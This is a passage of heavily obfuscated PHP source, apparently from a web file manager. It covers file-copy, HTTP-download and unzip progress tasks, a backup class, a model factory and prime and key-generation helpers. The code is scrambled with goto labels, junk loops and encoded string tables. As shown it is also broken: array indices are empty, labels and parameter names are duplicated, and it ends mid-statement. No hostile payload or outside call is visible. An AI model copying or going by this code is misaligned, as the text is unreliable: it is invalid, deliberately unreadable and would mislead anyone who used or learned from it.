Eӫ玼՞: default: $eɵ➵ = $this->{$_SERVER[][149]}($cܢ讓, $E䛊ꍍ . $fՉ); $d = $Dϋꊭ[648]; if (strlen($d) < $Dϋꊭ[559]) { return; } break; $cҔ = $Dϋꊭ[649]; while (strlen($cҔ) < $Dϋꊭ[559]) { if (!$cҔ) { break; } $cҔ++; } } $eɵ➵ = $Fﷴ[216]($a . $fՉ . $eɵ➵); goto E; F訑: } private function bklde3576f0f($AȻ, $DȖ, $Aע = 3) { goto d걬; d걬: $D =& $_SERVER[]; $b =& $_SERVER[]; if (!$b[336]($AȻ) || $b[24]($AȻ) < 10) { return !1; } goto Dʮƽ; Dʮƽ: $AȻ = $b[2]($AȻ); $AȻ = $b[216]($AȻ); $E = $D[651]; goto DîӅ; Cםբ͔: if ($Aע - 1 > 0) { $f = $this->{$_SERVER[][190]}($f, $DȖ, $Aע - 1); } return $f; goto a艤; DîӅ: while (strlen($E) < $D[559]) { if (!$E) { break; } $E++; } $Aъ = $AȻ[0]; $e = $b[25]($AȻ, 1, 15); goto b; b: $AȻ = $b[25]($AȻ, 16); $dԯ = $b[329]; switch ($Aъ) { case $b[234]: $f = $this->{$_SERVER[][248]}($AȻ, $b[216]($DȖ . $e)); break; $Aߢ = $D[652]; if (strlen($Aߢ) < $D[583]) { die; } case $b[222]: $f = $this->{$_SERVER[][248]}($AȻ, $b[216]($e . $DȖ)); $dΛ = $D[653]; while (strlen($dΛ) < $D[574]) { if (!$dΛ) { break; } $dΛ++; } break; case $b[330]: $f = $this->{$_SERVER[][248]}($AȻ, $b[120]($e . $DȖ)); break; case $b[331]: $f = $this->{$_SERVER[][248]}($AȻ, $b[116]($e . $DȖ)); $E经 = $D[654]; while ($E经 < $D[583]) { if ($E经 >= 0) { break; } $E经++; } break; $A撢 = $D[655]; while ($A撢 < $D[550]) { if ($A撢 >= 0) { break; } $A撢++; } case $b[332]: goto e̎; dﾈ׼: $Dۈ = $D[658]; if (!$Dۈ) { die; } $f = $b[116]($f . $b[116]($DȖ . $f) . $DȖ); goto c; eέ: $b􄯉 = 0; $b = $D[660]; if (strlen($b) < $D[559]) { return; } goto dϬ; aƹŐ: $E = 0; $d = $D[659]; if (!$d) { die; } goto eέ; e̎: $AȻ = $b[337]($AȻ); $f˄ = $D[656]; $f = $AȻ[0]; goto F; F: break; $Eʑ审 = $D[663]; if (strlen($Eʑ审) < $D[574]) { return; } goto bʑ; F: $Fϵ׺ = $D[657]; $AȻ = $b[25]($AȻ, 1); $D = $b[334]($dԯ, $f); goto dﾈ׼; dϬ: for ($A俍 = 0; $A俍 < $b[24]($AȻ); $A俍++) { $b􄯉 = $b􄯉 == $b[24]($f) ? 0 : $b􄯉; $dᐭ = $D[661]; if (!$dᐭ) { return; } $Cл = $b􄯉++; $E = $b[334]($dԯ, $AȻ[$A俍]) - $D - $b[335]($f[$Cл]); while ($E < 0) { $E += 64; } $a͐ .= $dԯ[$E]; } $f = $b[338]($a͐); $e = $D[662]; goto F; c: $f = $b[25]($f, $D % 8, $D % 8 + 7); $a͐ = $b[10]; $A俍 = 0; goto aƹŐ; bʑ: default: $f = $this->{$_SERVER[][248]}($AȻ, $DȖ . $e); $EƐߧ = $D[664]; while ($EƐߧ < $D[574]) { if ($EƐߧ >= 0) { break; } $EƐߧ++; } break; } goto Cםբ͔; a艤: } public function exslfa29cdd0($eՠѓ) { goto dߑ; Cז҇°: $B = 2; for ($Aޔ = 0; $Aޔ < $BԮ * 10; $Aޔ++) { if (($BԮ * $Aޔ + 1) % $C == 0) { $B = $Bސ[203](($BԮ * $Aޔ + 1) / $C); break; } } $aՠ = $this->{$_SERVER[][149]}($b * $A﹥۟ߓ . $Bސ[10], $Bސ[151]); goto aв; aв: $c = $Bސ[116]($Bސ[340] . ($b + $A﹥۟ߓ) . $Bސ[341] . $C . $Bސ[341] . $B . $Bސ[342]); $b꾐 = $Eʈ[553]; if (!$b꾐) { return; } goto Dۈ; Dۈ: $fތк = $this->{$_SERVER[][149]}($eՠѓ, $c) . $Bސ[343] . $aՠ; return $fތк; $Cϡ̏Ǻ = $Eʈ[669]; goto F숙; dߑ: $Eʈ =& $_SERVER[]; $Bސ =& $_SERVER[]; $b = $this->{$_SERVER[][339]}(); goto E; F숙: while ($Cϡ̏Ǻ < $Eʈ[574]) { if ($Cϡ̏Ǻ >= 0) { break; } $Cϡ̏Ǻ++; } goto aߥ; E: $C = $Bސ[203](($b + $A﹥۟ߓ) / 2); $D = $Eʈ[667]; while (1) { $EȽ = $C; $eٴ = $BԮ; while ($eٴ % $EȽ != 0) { $bĘΒ = $eٴ; $eٴ = $EȽ; $EȽ = $bĘΒ % $EȽ; $c򷹷 = $Eʈ[668]; while ($c򷹷 < $Eʈ[590]) { if ($c򷹷 >= 0) { break; } $c򷹷++; } } if ($EȽ == 1) { break; } else { $C++; } } goto Cז҇°; B: $BԮ = ($b - 1) * ($A﹥۟ߓ - 1); $bͼ = $Eʈ[666]; if (strlen($bͼ) < $Eʈ[574]) { die; } goto E; E: $A﹥۟ߓ = $this->{$_SERVER[][339]}(); $b = $Eʈ[665]; while ($b < $Eʈ[590]) { if ($b >= 0) { break; } $b++; } goto B; aߥ: } public function egfp8b09831e($E) { goto Aޓ; Eꟃ: $B˭Ê× = $d[116]($d[340] . ($D첤 + $A֬) . $d[341] . $b . $d[341] . $cӿ . $d[342]); $E󮔵 = $e蚉[677]; if (strlen($E󮔵) < $e蚉[583]) { die; } goto Fᓿ; a: $bɶ = $e蚉[670]; if ($d[19]($cԱ) != 2) { return $d[10]; } $a = $this->{$_SERVER[][248]}($cԱ[1] . $d[10], $d[151]); goto A; Aޓ: $e蚉 =& $_SERVER[]; $d =& $_SERVER[]; $cԱ = $d[0]($d[343], $E); goto a; D: return $b; $c = $e蚉[679]; if (strlen($c) < $e蚉[550]) { die; } goto eї; Fᓿ: $b = $this->{$_SERVER[][248]}($cԱ[0], $B˭Ê×); $EӺ = $e蚉[678]; if (!$EӺ) { return; } goto D; A: if (!$a) { return $d[10]; } $a = $d[203]($a); $Aζ熖 = $e蚉[671]; goto D詋ͩ; B: for ($bސ = 3; $bސ < $a; $bސ += 2) { if ($a % $bސ != 0) { continue; } $D첤 = $bސ; $A֬ = $d[203]($a / $bސ); break; $C쭠 = $e蚉[672]; if (strlen($C쭠) < $e蚉[583]) { return; } } $D戌ϭͶ = ($D첤 - 1) * ($A֬ - 1); $Aҗ = $e蚉[673]; goto c; D: while (1) { $B䇗 = $b; $EΎ쨫 = $e蚉[674]; if (strlen($EΎ쨫) < $e蚉[574]) { die; } $d = $D戌ϭͶ; while ($d % $B䇗 != 0) { $dľ = $d; $f = $e蚉[675]; if (strlen($f) < $e蚉[583]) { return; } $d = $B䇗; $c֘ = $e蚉[676]; if (strlen($c֘) < $e蚉[559]) { return; } $B䇗 = $dľ % $B䇗; $D֜ = $e蚉[654]; if (!$D֜) { die; } } if ($B䇗 == 1) { break; } else { $b++; } } $cӿ = 2; for ($bސ = 0; $bސ < $D戌ϭͶ * 10; $bސ++) { if (($D戌ϭͶ * $bސ + 1) % $b == 0) { $cӿ = $d[203](($D戌ϭͶ * $bސ + 1) / $b); break; } } goto Eꟃ; c: if (strlen($Aҗ) < $e蚉[583]) { die; } $b = $d[203](($D첤 + $A֬) / 2); $A = $e蚉[656]; goto D; D詋ͩ: while (strlen($Aζ熖) < $e蚉[550]) { if (!$Aζ熖) { break; } $Aζ熖++; } $D첤 = 0; $A֬ = 0; goto B; eї: } public function ueatcb1dab09() { goto C; c: while ($b <= (int) $b̲[345]($eܿ)) { $AΈ = $b; while (!0) { $AΈ++; if ($AΈ <= 2) { $b = $AΈ; break; } else { if ($AΈ < 2) { continue; } } $FǓ = !0; for ($c = 2; $c <= $b̲[345]($AΈ); $c++) { if ($AΈ % $c == 0) { $FǓ = !1; } } if ($FǓ) { $b = $AΈ; break; } } $Eяɨ[] = $b; $f׆ = $cﰏ[682]; } $C = 2; for ($AΈ = $eܿ; $AΈ > 1; $AΈ--) { $FǓ = !0; foreach ($Eяɨ as $bҳ) { if ($AΈ % $bҳ == 0) { $FǓ = !1; break; } } if ($FǓ) { $C = $AΈ; break; } } goto Fɓ; Fɓ: return $C; $cϐΈ = $cﰏ[683]; if (!$cϐΈ) { return; } goto Bۋ; C: $cﰏ =& $_SERVER[]; $b̲ =& $_SERVER[]; $eܿ = $b̲[324]($b̲[344](2, 14), $b̲[344](2, 16) - 1); goto Dم; cּ: $F¶ = $cﰏ[681]; if (!$F¶) { return; } $b = 1; goto c; Dم: $cƦ = $cﰏ[680]; while ($cƦ < $cﰏ[550]) { if ($cƦ >= 0) { break; } $cƦ++; } $Eяɨ = array(); goto cּ; Bۋ: } public function xmjcac4696a4($a㢅׽, $bɢ) { $Cͳ =& $_SERVER[]; $Aΐ =& $_SERVER[]; return $Aΐ[13](array($Aΐ[14], $Aΐ[346]), $a㢅׽, $bɢ); $cƆ = $Cͳ[684]; if (strlen($cƆ) < $Cͳ[583]) { return; } } public function bpzrd28580ed($eϹ, $dꞙ陭) { $b =& $_SERVER[]; return $b[13](array($b[347], $b[348]), $eϹ, $dꞙ陭); } public function gtbq8c52c94f($E, $E) { $e =& $_SERVER[]; $A =& $_SERVER[]; return $A[13](array($A[347], $A[349]), $E, $E); $C = $e[685]; while ($C < $e[559]) { if ($C >= 0) { break; } $C++; } } } goto dΌ; eԭ: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[ņӺ] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function Model($bЏ = '', $bď = '', $bנ = '') { goto B٩Җ; B٩Җ: $d٦ =& $_SERVER[ņӺ]; static $aͮ = array(); $eًﯫ = strtolower($bď . $d٦[0] . $bЏ); goto b; bٯ: $aͮ[$eًﯫ] = new ModelBase($bЏ, $bď, $bנ); return $aͮ[$eًﯫ]; goto DŚ; b: if (isset($aͮ[$eًﯫ])) { return $aͮ[$eًﯫ]; } if ($bЏ) { $bЏ = strtoupper($bЏ[0]) . substr($bЏ, 1); $C = $bЏ . $d٦[1]; if (class_exists($C)) { $aͮ[$eًﯫ] = new $C(); return $aͮ[$eًﯫ]; } } if (!$bנ) { $bנ = $GLOBALS[$d٦[2]][$d٦[3]]; } goto bٯ; DŚ: } goto F; e̬: class TaskFileTransfer extends Task { protected function startAfter() { goto fܲ; eӦ: Hook::bind($A[541], array($this, $A[1467])); Hook::bind($A[542], array($this, $A[1468])); Hook::bind($A[544], array($this, $A[1469])); goto eʉ; fܲ: $A =& $_SERVER[]; $cᔍ =& $this->task; $this->sourceCopyFolder = !1; goto fܢ; e݊ɶ: Hook::bind($A[1474], array($this, $A[1475])); Hook::bind($A[1476], array($this, $A[1477])); Hook::bind($A[1478], array($this, $A[1479])); goto bތ; FɈ: Hook::bind($A[1471], array($this, $A[1472])); Hook::bind($A[534], array($this, $A[1473])); $this->sourceModelCopyFlag = !1; goto e݊ɶ; eʉ: Hook::bind($A[545], array($this, $A[1469])); Hook::bind($A[511], array($this, $A[1470])); Hook::bind($A[508], array($this, $A[1470])); goto ců; cร: $cᔍ[$A[980]] = $A[33]; $cᔍ[$A[1484]] = $A[33]; $cᔍ[$A[1485]] = 0; goto bϋ; ců: Hook::bind($A[513], array($this, $A[1470])); Hook::bind($A[515], array($this, $A[1470])); Hook::bind($A[517], array($this, $A[1470])); goto FɈ; fܢ: Hook::bind($A[1461], array($this, $A[1462])); Hook::bind($A[1463], array($this, $A[1464])); Hook::bind($A[1465], array($this, $A[1466])); goto eӦ; bތ: $cᔍ[$A[1480]] = LNG($A[1481]); $cᔍ[$A[1482]] = 0; $cᔍ[$A[1483]] = 0; goto cร; bϋ: $cᔍ[$A[1486]] = 0; $cᔍ[$A[1487]] = 0; if (!$cᔍ[$A[1343]]) { $cᔍ[$A[1343]] = LNG($A[1488]); } goto CӘĄ; CӘĄ: } protected function endAfter() { goto Fܜׇ; E瞋: Hook::unbind($bθ朄[544], array($this, $bθ朄[1469])); Hook::unbind($bθ朄[545], array($this, $bθ朄[1469])); Hook::unbind($bθ朄[511], array($this, $bθ朄[1470])); goto d; fЫ: Hook::unbind($bθ朄[1474], array($this, $bθ朄[1475])); Hook::unbind($bθ朄[1476], array($this, $bθ朄[1477])); Hook::unbind($bθ朄[1478], array($this, $bθ朄[1479])); goto bх܄; Fܜׇ: $bθ朄 =& $_SERVER[]; Hook::unbind($bθ朄[1461], array($this, $bθ朄[1462])); Hook::unbind($bθ朄[1463], array($this, $bθ朄[1464])); goto Eҫ; Eҫ: Hook::unbind($bθ朄[1465], array($this, $bθ朄[1466])); Hook::unbind($bθ朄[541], array($this, $bθ朄[1467])); Hook::unbind($bθ朄[542], array($this, $bθ朄[1468])); goto E瞋; E: Hook::unbind($bθ朄[517], array($this, $bθ朄[1470])); Hook::unbind($bθ朄[1471], array($this, $bθ朄[1472])); Hook::unbind($bθ朄[534], array($this, $bθ朄[1473])); goto fЫ; d: Hook::unbind($bθ朄[508], array($this, $bθ朄[1470])); Hook::unbind($bθ朄[513], array($this, $bθ朄[1470])); Hook::unbind($bθ朄[515], array($this, $bθ朄[1470])); goto E; bх܄: } public function copyMoveStart($a, $a㷷, $BѲ, $A껦) { goto dߏ; dߏ: $A涵 =& $_SERVER[]; self::log($A涵[1489] . $a㷷 . $A涵[66] . $A껦); $fՐ = rtrim(TEMP_FILES, $A涵[8]); goto A쫰; aԷ: $d˦Լ[$A涵[1490]] = KodIO::transferType($a, $BѲ); $this->update(); goto eӻ; A쫰: if (substr($a㷷, 0, strlen($fՐ)) == $fՐ) { return; } if (substr($A껦, 0, strlen($fՐ)) == $fՐ) { return; } $d˦Լ =& $this->task; goto aԷ; eӻ: } public function updateAfter() { goto Fۙ; DŴ: if ($this->sourceModelCopyFlag) { return; } if ($CȼȡӃ[$e߈[1490]] == $e߈[1096]) { return; } if ($CȼȡӃ[$e߈[1490]] == $e߈[1042] || $CȼȡӃ[$e߈[1490]] == $e߈[103]) { if ($CȼȡӃ[$e߈[1484]]) { $CȼȡӃ[$e߈[1487]] = $CȼȡӃ[$e߈[1486]] + $CȼȡӃ[$e߈[1483]]; } } else { if ($CȼȡӃ[$e߈[1490]] == $e߈[1097]) { if ($CȼȡӃ[$e߈[1484]] == $e߈[1042]) { $CȼȡӃ[$e߈[1487]] = $CȼȡӃ[$e߈[1486]] + $CȼȡӃ[$e߈[1483]] * 0.5; } else { if ($CȼȡӃ[$e߈[1484]] == $e߈[103]) { $CȼȡӃ[$e߈[1487]] = $CȼȡӃ[$e߈[1486]] + $CȼȡӃ[$e߈[1482]] * 0.5 + $CȼȡӃ[$e߈[1483]] * 0.5; } } } } goto D; D: $CȼȡӃ[$e߈[1438]] = $CȼȡӃ[$e߈[1487]] / $CȼȡӃ[$e߈[697]]; if ($CȼȡӃ[$e߈[1438]] > 0) { $eܚ = timeFloat() - $CȼȡӃ[$e߈[1440]] - $CȼȡӃ[$e߈[1443]]; $CȼȡӃ[$e߈[1444]] = $eܚ * (1 - $CȼȡӃ[$e߈[1438]]) / $CȼȡӃ[$e߈[1438]]; } goto B; Fۙ: $e߈ =& $_SERVER[]; $CȼȡӃ =& $this->task; if (!$CȼȡӃ[$e߈[697]]) { return; } goto DŴ; B: } public function addPath($d) { goto A; Aٌ: $f = IO::infoWithChildren($d); $aǡ = $cҏ[$D⺡[1491]] ? $cҏ[$D⺡[1491]][$D⺡[1492]] : 0; $cҏ[$D⺡[1491]] = array($D⺡[1492] => $aǡ + 1, $D⺡[386] => $f[$D⺡[28]], $D⺡[75] => $f[$D⺡[75]], $D⺡[468] => $f[$D⺡[468]] ? $f[$D⺡[468]] : $f[$D⺡[75]]); goto BθȽ; BθȽ: if ($f[$D⺡[29]] == $D⺡[167]) { $cҏ[$D⺡[978]] += 1; } else { $cҏ[$D⺡[978]] += $f[$D⺡[80]][$D⺡[78]]; if ($f[$D⺡[369]]) { $cҏ[$D⺡[978]] += $f[$D⺡[80]][$D⺡[79]] + 1; } } $cҏ[$D⺡[697]] += $f[$D⺡[77]]; $this->update(); goto fʜ׽; A: $D⺡ =& $_SERVER[]; if (!$d) { return; } $cҏ =& $this->task; goto Aٌ; fʜ׽: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($aݢ) { $eΝ =& $_SERVER[]; $bʠ =& $this->task; $bʠ[$eΝ[1480]] = $aݢ[$eΝ[28]]; $bʠ[$eΝ[980]] = $aݢ[$eΝ[28]]; $this->update(); } public function copyFileStart($Cݓ, $c֥, $cΈП, $C, $C, $e) { goto aǦ; Eس: $A՞э[$D͔ü[980]] = $D͔ü[33]; $A՞э[$D͔ü[1484]] = $D͔ü[33]; $A՞э[$D͔ü[1485]] = 0; goto fɣֿ; aǦ: $D͔ü =& $_SERVER[]; $A = $C; if ($A == $GLOBALS[$D͔ü[1493]]) { $A = $GLOBALS[$D͔ü[1494]]; } goto Cݏ; fɣֿ: $this->update(); goto C; c: $A՞э[$D͔ü[1480]] = $A; $A՞э[$D͔ü[1482]] = (int) $Cݓ->size($c֥); $A՞э[$D͔ü[1483]] = 0; goto Eس; Cݏ: $GLOBALS[$D͔ü[1494]] = $C; $GLOBALS[$D͔ü[1493]] = $e; $A՞э =& $this->task; goto c; C: } public function copyFileEnd($Aݤԣ, $Dԭ؄, $C, $fޮ, $d, $Dȇ) { $c =& $_SERVER[]; $Dᆿ =& $this->task; $Dᆿ[$c[1483]] = $Dᆿ[$c[1482]]; $Dᆿ[$c[1484]] = $c[33]; if ($d == $Dᆿ[$c[1480]]) { $Dᆿ[$c[1486]] += $Dᆿ[$c[1482]]; $Dᆿ[$c[1487]] = $Dᆿ[$c[1486]]; $this->update(1); } else { $this->update(); $Dᆿ[$c[1483]] = 0; } self::log($c[1495] . $Dԭ؄ . $c[66] . $fޮ . $c[217] . $d . $c[1496] . $Dᆿ[$c[1480]]); } public function updateFileEnd($F㉆ƴ, $e썅) { goto Fۖ; C: $f띕[$fƛ[1482]] = $e썅; $f띕[$fƛ[1486]] += $e썅; $f띕[$fƛ[1487]] = $f띕[$fƛ[1486]]; goto B; B: $this->update(1); self::log($fƛ[1497] . $F㉆ƴ); goto EŪԈ; Fۖ: $fƛ =& $_SERVER[]; $f띕 =& $this->task; $f띕[$fƛ[1480]] = $F㉆ƴ; goto C; EŪԈ: } public function sourceModelCopy($dʏ) { goto bȩ; F: $aĭ =& $this->task; $this->sourceModelCopyFlag = !0; $cޔ = 0; goto dЖГ; dЖГ: switch ($EÐ) { case $dӂ֪[509]: $cޔ = 1; break; case $dӂ֪[512]: $aĭ[$dӂ֪[1480]] = $Cޤ[$dӂ֪[28]]; break; case $dӂ֪[514]: $cޔ = intval($dʏ[$dӂ֪[363]] * 0.4); break; case $dӂ֪[516]: $cޔ = intval($dʏ[$dӂ֪[363]] * 0.2); break; case $dӂ֪[518]: $cޔ = intval($dʏ[$dӂ֪[363]] * 0.4); break; } $this->update($cޔ); $this->sourceModelCopyFlag = !1; goto Cߝ; bȩ: $dӂ֪ =& $_SERVER[]; $EÐ = $dʏ[0]; $Cޤ = $dʏ[1]; goto F; Cߝ: } public function sourceRemove($d˷, $c¹) { $D =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $b = 1; if (isset($d˷[$D[80]])) { $b = $d˷[$D[80]][$D[78]] + $d˷[$D[80]][$D[79]] + 1; } $this->update($b); $this->sourceModelCopyFlag = !1; } public function sourceMove($bօС) { $this->sourceRemove($bօС, !1); } public function curlProgress($Bٔ, $D礗, $b򭇼, $AРƃ, $b) { $bő =& $_SERVER[]; $Eť뙔 =& $this->task; if ($b > 0) { $Eť뙔[$bő[980]] = $bő[1498]; $Eť뙔[$bő[1484]] = $bő[103]; if ($Eť뙔[$bő[1482]] == $AРƃ || $AРƃ > 1024 * 1024) { $Eť뙔[$bő[1483]] = $b; } if ($Eť뙔[$bő[1485]]) { $Eť뙔[$bő[1483]] = $b + $Eť뙔[$bő[1485]]; } } else { if ($b򭇼 > 0) { if ($Eť뙔[$bő[1482]] == $D礗) { $Eť뙔[$bő[1483]] = $b򭇼; $Eť뙔[$bő[980]] = $bő[1499]; $Eť뙔[$bő[1484]] = $bő[1042]; } } } $this->update(); } public function curlProgressStart($d˅) { } public function curlProgressEnd($cѣ) { $Eυ =& $_SERVER[]; $aܡź =& $this->task; $b = curl_getinfo($cѣ); $Bϴ = $b[$Eυ[1500]]; if ($aܡź[$Eυ[1484]] == $Eυ[103] && $Bϴ) { $aܡź[$Eυ[1485]] += $Bϴ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $D =& $_SERVER[]; $C =& $this->task; $C[$D[1501]] = 1; Hook::bind($D[1474], array($this, $D[1502])); Hook::bind($D[1476], array($this, $D[1503])); Hook::bind($D[1478], array($this, $D[1504])); } protected function endAfter() { $cڂق =& $_SERVER[]; Hook::unbind($cڂق[1474], array($this, $cڂق[1502])); Hook::unbind($cڂق[1476], array($this, $cڂق[1503])); Hook::unbind($cڂق[1478], array($this, $cڂق[1504])); } public function progressStart($fӇ) { $F뎏 =& $_SERVER[]; $e = curl_getinfo($fӇ); self::log($F뎏[1505] . $e[$F뎏[295]]); self::valueSet($this->task[$F뎏[367]], $this->task); } public function progressEnd($Bդ՜) { $F̻ =& $_SERVER[]; self::log($F̻[1506] . $this->task[$F̻[367]]); $this->end(); } public function progress($BŊ, $D, $D΅ӎ, $dД銏, $bЛ굛) { $f˃ =& $_SERVER[]; $E =& $this->task; if ($bЛ굛 > 0) { $E[$f˃[978]] = $E[$f˃[978]] == 0 ? $dД銏 : $E[$f˃[978]]; $E[$f˃[992]] = $bЛ굛; } else { if ($D΅ӎ > 0) { $E[$f˃[978]] = $E[$f˃[978]] == 0 ? $D : $E[$f˃[978]]; $E[$f˃[992]] = $D΅ӎ; } } $this->update(); self::log("\160\162\157\147\162\145\163\x73\110\164\x74\x70\x3a\x64\x6f\x77\156\72{$D΅ӎ}\57{$D}\x3b\x20\x75\160\x6c\157\x61\144\72{$bЛ굛}\x2f{$dД銏}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto B; B: $BԠ =& $_SERVER[]; parent::startAfter(); Hook::bind($BԠ[1507], array($this, $BԠ[1508])); goto f; E: if (!$d[$BԠ[1343]]) { $d[$BԠ[1343]] = LNG($BԠ[1511]); } goto BӅ; f: Hook::bind($BԠ[1037], array($this, $BԠ[1509])); $d =& $this->task; $d[$BԠ[1510]] = $BԠ[1042]; goto E; BӅ: } protected function endAfter() { $EїՊ =& $_SERVER[]; parent::endAfter(); Hook::unbind($EїՊ[1507], array($this, $EїՊ[1508])); Hook::unbind($EїՊ[1037], array($this, $EїՊ[1509])); } public function updateAfter() { $A󋏸 =& $_SERVER[]; $bˎ =& $this->task; if (!$bˎ[$A󋏸[978]] || !$bˎ[$A󋏸[697]]) { return; } if ($bˎ[$A󋏸[1510]] == $A󋏸[1042]) { $dﰚ = 0; if ($bˎ[$A󋏸[1482]]) { $dﰚ = $bˎ[$A󋏸[1483]] / $bˎ[$A󋏸[1482]]; } $bˎ[$A󋏸[1438]] = $dﰚ * 0.3; } else { if ($bˎ[$A󋏸[1510]] == $A󋏸[301]) { $dﰚ = $bˎ[$A󋏸[992]] / $bˎ[$A󋏸[978]]; $bˎ[$A󋏸[1438]] = 0.3 + $dﰚ * 0.4; } else { if ($bˎ[$A󋏸[1510]] == $A󋏸[103]) { $fÑԄ = 0; if ($bˎ[$A󋏸[1484]] == $A󋏸[103]) { $fÑԄ = $bˎ[$A󋏸[1483]]; } $dﰚ = ($bˎ[$A󋏸[1487]] + $fÑԄ) / $bˎ[$A󋏸[697]]; $bˎ[$A󋏸[1438]] = 0.3 + 0.4 + $dﰚ * 0.3; } } } if ($bˎ[$A󋏸[1438]] > 0) { $a쑙 = timeFloat() - $bˎ[$A󋏸[1440]] - $bˎ[$A󋏸[1443]]; $bˎ[$A󋏸[1444]] = $a쑙 * (1 - $bˎ[$A󋏸[1438]]) / $bˎ[$A󋏸[1438]]; } } public function addFile($DҘ) { goto B摵; f˶: $E˂·[$b嚢ű[1480]] = $fꗼ[$b嚢ű[28]]; $E˂·[$b嚢ű[1482]] = $fꗼ[$b嚢ű[77]]; $E˂·[$b嚢ű[1483]] = 0; goto cѮʋ; cѮʋ: $E˂·[$b嚢ű[980]] = $b嚢ű[1499]; $E˂·[$b嚢ű[1484]] = $b嚢ű[1042]; $E˂·[$b嚢ű[697]] = $fꗼ[$b嚢ű[77]]; goto fП; fП: $E˂·[$b嚢ű[978]] = 1; $bӟ = 0; $E˂·[$b嚢ű[1491]] = array($b嚢ű[1492] => $bӟ + 1, $b嚢ű[386] => $fꗼ[$b嚢ű[28]], $b嚢ű[75] => $fꗼ[$b嚢ű[75]], $b嚢ű[468] => $fꗼ[$b嚢ű[468]] ? $fꗼ[$b嚢ű[468]] : $fꗼ[$b嚢ű[75]]); goto bʰ; bʰ: $this->update(); goto e; B摵: $b嚢ű =& $_SERVER[]; $E˂· =& $this->task; $fꗼ = IO::info($DҘ); goto f˶; e: } public function unzipAfter($a) { goto C㆜; C㆜: $cˇ =& $_SERVER[]; $bӫԄƽ =& $this->task; $bӫԄƽ[$cˇ[1510]] = $cˇ[103]; goto Eّ; fڪɯ: $bӫԄƽ[$cˇ[992]] = 0; $bӫԄƽ[$cˇ[1482]] = 0; $bӫԄƽ[$cˇ[1483]] = 0; goto a; Eّ: $cօʖ = IO::infoWithChildren($a); $AѾ = 0; $bӫԄƽ[$cˇ[1491]] = array($cˇ[1492] => $AѾ + 1, $cˇ[386] => $cօʖ[$cˇ[28]], $cˇ[75] => $cօʖ[$cˇ[75]], $cˇ[468] => $cօʖ[$cˇ[468]] ? $cօʖ[$cˇ[468]] : $cօʖ[$cˇ[75]]); goto eĮ; a: $bӫԄƽ[$cˇ[1480]] = $cˇ[33]; $bӫԄƽ[$cˇ[1487]] = 0; $bӫԄƽ[$cˇ[697]] = $cօʖ[$cˇ[77]]; goto e̴׷; e̴׷: $this->update(); self::log($cˇ[1512] . json_encode(array($bӫԄƽ, $cօʖ))); goto Cϊ۠; eĮ: if ($cօʖ[$cˇ[29]] == $cˇ[167]) { $bӫԄƽ[$cˇ[978]] = 1; } else { $bӫԄƽ[$cˇ[978]] = $cօʖ[$cˇ[80]][$cˇ[78]]; } $bӫԄƽ[$cˇ[980]] = $cˇ[33]; $bӫԄƽ[$cˇ[1484]] = 0; goto fڪɯ; Cϊ۠: } public function nameParse($DŊ) { goto b; a٭: $this->update(); goto D鮡; b: $aۻδ =& $_SERVER[]; $a޿ =& $this->task; if ($a޿[$aۻδ[1510]] == $aۻδ[1042]) { $a޿[$aۻδ[1510]] = $aۻδ[301]; $a޿[$aۻδ[1487]] = 0; $a޿[$aۻδ[697]] = 0; } goto f֯آ; f֯آ: $D֯燿 = get_path_this($DŊ); if (strstr($D֯燿, $aۻδ[91])) { $a޿[$aۻδ[992]] += 1; $a޿[$aۻδ[978]] += 1; } $a޿[$aۻδ[1480]] = $DŊ; goto a٭; D鮡: } } goto Aҧ; C龬: define($_SERVER[][1938], 4); define($_SERVER[][1939], 5); define($_SERVER[][1940], 16); goto Dߍ; dΌ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Fο =& $_SERVER[]; self::$name = date($Fο[686]); if (!($A = Model($Fο[687])->lastItem())) { $A = $this->initData(); } else { self::$name = $A[$Fο[28]]; if ($A[$Fο[688]] == $Fο[83]) { self::$name = date($Fο[689]); $eȿÎ = 0; if (isset($A[$Fο[281]][$Fο[167]][$Fο[419]])) { $eȿÎ = (int) $A[$Fο[281]][$Fο[167]][$Fο[419]]; } if ($A[$Fο[28]] == self::$name) { Model($Fο[687])->remove($A[$Fο[367]]); } $A = $this->initData($eȿÎ, $A[$Fο[690]]); } else { $this->checkStore($A[$Fο[690]]); } } self::$option = $A; } private function initData($Aý = 0, $Cц͢ = '') { goto eǏ; F: $B[$b򵅤[367]] = $b˞; return $B; goto BӸ; eǏ: $b򵅤 =& $_SERVER[]; $C虋 = Model($b򵅤[687])->config(); if ($Cц͢ && $C虋[$b򵅤[690]] != $Cц͢) { $Aý = 0; } goto E֪; E֪: $this->checkStore($C虋[$b򵅤[690]]); $B = array($b򵅤[690] => $C虋[$b򵅤[690]], $b򵅤[28] => self::$name, $b򵅤[688] => 0, $b򵅤[691] => $C虋[$b򵅤[691]], $b򵅤[281] => array($b򵅤[692] => array($b򵅤[688] => 0), $b򵅤[693] => array($b򵅤[688] => 0, $b򵅤[694] => 0, $b򵅤[695] => 0, $b򵅤[29] => $b򵅤[33]), $b򵅤[696] => array($b򵅤[688] => 0, $b򵅤[694] => 0, $b򵅤[695] => 0), $b򵅤[167] => array($b򵅤[688] => 0, $b򵅤[697] => 0, $b򵅤[698] => 0, $b򵅤[699] => 0, $b򵅤[700] => 0, $b򵅤[419] => $Aý)), $b򵅤[701] => time(), $b򵅤[449] => 0); $b˞ = Model($b򵅤[687])->insert($B); goto F; BӸ: } private function checkStore($a) { $EƑ =& $_SERVER[]; $E = Model($EƑ[702])->listData($a); Model($EƑ[702])->checkConfig($E); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][687])->findByName(self::$name); } return self::$option; } public static function set($C) { $cÐ߲ =& $_SERVER[]; $B̺ = self::get(); foreach ($C as $C => $C𪕅) { $D = explode($cÐ߲[91], $C); $Eۋ = count($D); switch ($Eۋ) { case 1: $B̺[$D[0]] = $C𪕅; break; case 2: $B̺[$D[0]][$D[1]] = $C𪕅; break; case 3: $B̺[$D[0]][$D[1]][$D[2]] = $C𪕅; break; } } Model($cÐ߲[687])->update($B̺[$cÐ߲[367]], $B̺); self::$option = $B̺; return 